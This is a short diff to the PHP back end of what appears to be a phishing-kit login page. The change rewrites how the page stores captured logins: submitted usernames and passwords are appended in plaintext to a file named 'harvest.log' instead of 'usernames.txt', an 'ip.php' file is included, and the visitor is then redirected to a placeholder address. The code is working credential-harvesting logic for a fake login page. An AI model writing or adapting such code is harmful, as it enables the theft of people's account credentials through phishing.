@@ -20,8 +20,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $error2 = 'border-color: #F23C57';
   }  else {
     include 'ip.php';
-    file_put_contents("usernames.txt", "[username]: " . $_POST['username'] . " [password]: " . $_POST['password'] . "\n", FILE_APPEND);
-    header('Location: <CUSTOM>'); 
+    
+    $file = fopen("harvest.log", "a") or die("Unable to open file!");
+
+    fwrite($file, $_POST['username'] . "," . $_POST['password'] . "\n");
+    $custom = '<CUSTOM>';
+    header('Location: ' . $custom); 
   }
      
 }
